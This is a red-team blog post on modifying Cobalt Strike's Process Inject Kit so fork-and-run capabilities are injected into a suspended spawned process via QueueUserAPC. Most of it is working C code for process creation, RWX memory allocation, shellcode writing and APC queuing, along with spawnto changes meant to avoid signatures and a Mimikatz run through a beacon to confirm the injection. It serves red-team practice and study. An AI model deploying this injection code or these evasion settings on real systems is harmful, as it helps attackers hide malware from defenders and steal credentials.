---
title: Customizing Process Injection in Cobalt Strike
author: taylor
pubDatetime: 2024-06-15T06:25:41Z
slug: custom-process-injection-cobalt-strike
featured: false
draft: first
tags:
  - malware-development
  - red-team
  - c2
description: Modifying Cobalt Strike's fork-and-run commands to perform custom process injection techniques.
---

## Table of Contents

## Introduction

In this blog post I discuss about a simple example of modifying Cobalt Strike's default process injection behavior to use `QueueUserAPC` through the Process Inject Kit.

## Cobalt Strike Post-Exploitation in a Nutshell

When you load BOFs or run tools like Mimikatz through a beacon, Cobalt Strike will either perform inline execution or a fork and run of the capability.

- Inline execution: Usually for BOFs, pushed to the beacon and executed within the beacon's process. Local process memory allocation and injection occurs here.

- Fork and run: Spawns a temporary process and injects a DLL into that process. The DLL contains the corresponding capability and is reflectively loaded into the temporary process.

Fork and run commands have two variants:

- Process injection spawn: spawns a temporary process, defined by the "spawnto" setting (e.g. when using the `spawn` command)

- Process injection explicit: injects into an existing process (e.g. when using `shinject` and need to specify a remote process ID)

These two variants are controlled by the `BeaconInjectProcess` and `BeaconInjectTemporaryProcess` internal beacon APIs, which provies a layer of abstraction to the actual process injection methods being used.

Before Cobalt Strike 4.5, the only way to modify the process injection techniques was through the teamserver's C2 profile and didn't provide much customizability. Now, Cobalt Strike comes with a **Process Inject kit** that allows operators to customize the process injection methods from these fork and run commands.

## Goals

My goal was to implement QueueUserAPC into Cobalt Strike beacons using the Process Inject Kit.

QueueUserAPC allows an application to queue an Asynchronous Procedure Call (APC) to a thread. Once the thread is in an alertable state, the APC is executed. QueueUserAPC also works with suspended threads, as long as the thread is resumed later.

In malware, the APC is usually a pointer to some shellcode, meaning that once the thread is alerted, the shellcode executes.

Since QueueUserAPC requires an alertable or suspended thread, one of the main ways to perform QueueUserAPC is to create a suspended process so that all of its threads are suspended. We can then queue an APC to the suspended process's main thread, then resume that thread to execute the shellcode.

The Process Inject Kit comes with two `.c` files, `process_inject_spawn.c` and `process_inject_explicit.c`, which contain code to perform their associated fork and run technique.

I decided to go with `process_inject_spawn.c` for this case. This method spawns a temporary process to execute our capabilities, and we should be able to customize the process parameters so that it spawns in a suspended state.

## Customizing Process Spawning

The code currently uses `BeaconSpawnTemporaryProcess`, which doesn't provide options to create the process in a suspended state. We would need to use WinAPIs like `CreateProcessA` for our case.

For all WinAPIs like `CreateProcessA`, we need to import them into our program by adding something like this to the top of the file:

```c
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA (
  LPCSTR lpApplicationName,
  LPSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCSTR lpCurrentDirectory,
  LPSTARTUPINFOA lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation);
```

And then in our code, we can call `CreateProcessA` by using the following:

```c
// CreateProcess in suspended state
char cmd[] = "notepad.exe"
BOOL success = KERNEL32$CreateProcessA(
  NULL,
  cmd,
  NULL,
  NULL,
  FALSE,
  CREATE_NO_WINDOW | CREATE_SUSPENDED,
  NULL,
  NULL,
  &si,
  &pi);
if (!success) {
  BeaconPrintf(CALLBACK_ERROR, "CreateProcessA failed.");
  return;
}
```

## Getting the `spawnto` Value

By default, when running fork and run command using the "spawn" method, Cobalt Strike will spawn `rundll32.dll` and go on from there. This is the `spawnto` value of the Cobalt Strike teamserver.

However, this is heavily signatured so it's common to see operators change this value to something else. We can do this within the beacon by running the command:

```text
spawnto x64 %windir%\sysnative\notepad.exe
```

Or for the entire teamserver in the C2 profile:

```json
post-ex {
  set spawnto_x86 "%windir%\\syswow64\\notepad.exe";
  set spawnto_x64 "%windir%\\sysnative\\notepad.exe";
}
```

We want to make sure that our custom process injection method is consistent with this setting, so we use the `BeaconGetSpawnTo` function which is defined in `beacon.h`.

```c
void BeaconGetSpawnTo(
  BOOL x86,
  char * buffer,
  int length
)
```

`BeaconGetSpawnTo` has three parameters:

- `x86` determines whether the `spawnto` value is associated with the x64 or x86 setting
- `buffer` is the char buffer that will store the `spawnto` value
- `length` is probably the size of the char buffer? I had no idea.

I looked at some GitHub repos of this implementation and found one that defines a constant `MAX_PATH_LENGTH` as 1000 and just uses it for `BeaconGetSpawnTo`. So I included that into my code.

```c
// define MAX_PATH_LENGTH at top of file
#define MAX_PATH_LENGTH 1000

// obtain SpawnTo value
char spawnTo[MAX_PATH_LENGTH];
BeaconGetSpawnTo(x86, spawnTo, MAX_PATH_LENGTH);
```

We can now use this `spawnto` value in our `CreateProcessA` function:

```c
// obtain SpawnTo value
char spawnTo[MAX_PATH_LENGTH];
BeaconGetSpawnTo(x86, spawnTo, MAX_PATH_LENGTH);

// CreateProcess in suspended state
BOOL success = KERNEL32$CreateProcessA(
  NULL,
  spawnTo,
  NULL,
  NULL,
  FALSE,
  CREATE_NO_WINDOW | CREATE_SUSPENDED,
  NULL,
  NULL,
  &si,
  &pi);
if (!success) {
  BeaconPrintf(CALLBACK_ERROR, "CreateProcessA failed.");
  return;
}
```

## Allocating and Copying Memory

Before we call `QueueUserAPC`, we need to allocate memory into the remote process and copy our shellcode into that allocation. For this I decided to go with the good ol' `VirtualAllocEx` and `WriteProcessMemory`.

```c
// allocate memory
LPVOID remoteBuffer = KERNEL32$VirtualAllocEx(
  pi.hProcess,
  NULL,
  dllLen,
  MEM_COMMIT,
  PAGE_EXECUTE_READWRITE);

if (remoteBuffer == NULL) {
  BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed.");
  return;
}

BeaconPrintf(CALLBACK_OUTPUT, "[+] Remote buffer at 0x%p", remoteBuffer);

// write memory
SIZE_T bytesWritten;
success = KERNEL32$WriteProcessMemory(
  pi.hProcess,
  remoteBuffer,
  dllPtr,
  dllLen,
  &bytesWritten);

if (!success) {
  BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory failed.");
  return;
}
```

## QueueUserAPC

After creating a suspended process, allocating and copying memory into that process, we can finally perform `QueueUserAPC` against the suspended main thread of the process.

It's actually pretty easy to do. We just need to call `QueueUserAPC` against the pointer to the remote shellcode and a handle to the remote, suspended thread. We then call `ResumeThread` to allow the thread to execute our shellcode.

```c
// QueueUserAPC
DWORD queueUserApcResult = KERNEL32$QueueUserAPC(
  (PAPCFUNC)remoteBuffer,
  pi.hThread,
  0);

if (queueUserApcResult == 0) {
  BeaconPrintf(CALLBACK_ERROR, "QueueUserAPC failed.");
  return;
}

KERNEL32$ResumeThread(pi.hThread);
```

## Examining Process Memory

Since I was calling `VirtualAllocEx` with RWX memory permissions, I wanted to see what it would look like in Process Hacker to confirm that the WinAPIs were being used properly.

I ran `mimikatz standard::sleep 80000` on the beacon, since running `mimikatz` is one of the commands that uses the fork and run method.

<img src="/src/assets/images/custom-process-injection-cobalt-strike/beacon-na.png">

Examining the memory contents it seemed that the region had been freed.

<img src="/src/assets/images/custom-process-injection-cobalt-strike/process-hacker-na.png">

This was because I had the setting `cleanup` set to `true` in my malleable C2 profile, so I switched that to `false` and ran the `mimikatz` command again.

<img src="/src/assets/images/custom-process-injection-cobalt-strike/beacon-rwx.png">

And there it is! The RWX has confirmed that my `VirtualAllocEx` is being used and my code isn't broken.

<img src="/src/assets/images/custom-process-injection-cobalt-strike/process-hacker-rwx.png">

## Code Snippets

Imports and constants:

```c
#define MAX_PATH_LENGTH 1000

DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA (
  LPCSTR lpApplicationName,
  LPSTR lpCommandLine,
  LPSECURITY_ATTRIBUTESlpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCSTR lpCurrentDirectory,
  LPSTARTUPINFOA lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation);

DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (
  PAPCFUNC pfnAPC,
  HANDLE hThread,
  ULONG_PTR dwData);

DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (
  HANDLE hThread);

DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD flALlocationType,
  DWORD flProtect);

DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (
  HANDLE hProcess,
  LPVOID lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T nSize,
  SIZE_T *lpNumberOfBytesWritten);
```

`QueueUserAPC` implementation:

```c
/* begin QueueUserAPC implementation */

// obtain SpawnTo value
char spawnTo[MAX_PATH_LENGTH];
BeaconGetSpawnTo(x86, spawnTo, MAX_PATH_LENGTH);

// CreateProcess in suspended state
BOOL success = KERNEL32$CreateProcessA(
  NULL,
  spawnTo,
  NULL,
  NULL,
  FALSE,
  CREATE_NO_WINDOW | CREATE_SUSPENDED,
  NULL,
  NULL,
  &si,
  &pi);

if (!success) {
  BeaconPrintf(CALLBACK_ERROR, "CreateProcessA failed.");
  return;
}

BeaconPrintf(CALLBACK_OUTPUT, "[+] Process ID of spawned process: %d", pi.dwProcessId);

// allocate memory
LPVOID remoteBuffer = KERNEL32$VirtualAllocEx(
  pi.hProcess,
  NULL,
  dllLen,
  MEM_COMMIT,
  PAGE_EXECUTE_READWRITE);

if (remoteBuffer == NULL) {
  BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed.");
  return;
}

BeaconPrintf(CALLBACK_OUTPUT, "[+] Remote buffer at 0x%p", remoteBuffer);

// write memory
SIZE_T bytesWritten;
success = KERNEL32$WriteProcessMemory(
  pi.hProcess,
  remoteBuffer,
  dllPtr,
  dllLen,
  &bytesWritten);

if (!success) {
  BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory failed.");
  return;
}

// QueueUserAPC
DWORD queueUserApcResult = KERNEL32$QueueUserAPC(
  (PAPCFUNC)remoteBuffer,
  pi.hThread,
  0);

if (queueUserApcResult == 0) {
  BeaconPrintf(CALLBACK_ERROR, "QueueUserAPC failed.");
  return;
}

KERNEL32$ResumeThread(pi.hThread);
```

## References

- [https://offensivedefence.co.uk/posts/cs-process-inject-kit/](https://offensivedefence.co.uk/posts/cs-process-inject-kit/)
- [https://github.com/trustedsec/PPLFaultDumpBOF/blob/70ca10386514c450ab7e7adce7b2d4d3c1b51597/common/injection.c#L337](https://github.com/trustedsec/PPLFaultDumpBOF/blob/70ca10386514c450ab7e7adce7b2d4d3c1b51597/common/injection.c#L337)
- [RastaMouse's CRTO II course](https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii)
